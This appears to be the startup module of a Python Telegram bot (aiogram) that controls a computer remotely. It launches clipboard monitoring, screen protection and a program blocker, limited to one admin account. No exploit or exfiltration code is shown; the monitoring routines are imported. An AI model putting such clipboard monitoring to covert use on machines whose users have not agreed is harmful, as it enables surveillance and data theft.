import asyncio
from app.database import db
from aiogram import Bot, Dispatcher
from app.commands import start_monitoring, cmd_start_on_launch, monitoring_manager, start_program_blocker
from app.handlers import register_handlers
from app.middleware import AccessMiddleware
from app.screen_protection import start_screen_protection, stop_screen_protection

bot_instance = None
monitoring_task = None
program_blocker_task = None


async def start_bot():
    """Запуск и настройка бота"""
    global bot_instance, monitoring_task, program_blocker_task
    
    bot_token = db.get_bot_token()
    if not bot_token:
        print("[X] Token not found!")
        return
    
    bot_instance = Bot(token=bot_token)
    dp = Dispatcher(bot=bot_instance)
    
    admin_id = db.get_admin_id()
    dp.message.middleware(AccessMiddleware(admin_id))
    dp.callback_query.middleware(AccessMiddleware(admin_id))
    
    register_handlers(dp)
    
    print("[*] Bot started!")
    
    await cmd_start_on_launch()
    start_screen_protection()
    
    # Запускаем мониторинг буфера обмена
    monitoring_task = asyncio.create_task(start_monitoring(bot_instance))
    
    # Запускаем мониторинг программ если был включен
    if monitoring_manager['programs']['enabled']:
        print("[*] Starting program blocker...")
        program_blocker_task = asyncio.create_task(start_program_blocker(bot_instance))
    
    await bot_instance.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot_instance)


async def stop_bot():
    """Остановка бота"""
    global monitoring_task, program_blocker_task
    
    if monitoring_task and not monitoring_task.done():
        monitoring_task.cancel()
    
    if program_blocker_task and not program_blocker_task.done():
        program_blocker_task.cancel()
    
    stop_screen_protection()
    
    try:
        db.close()
    except:
        pass
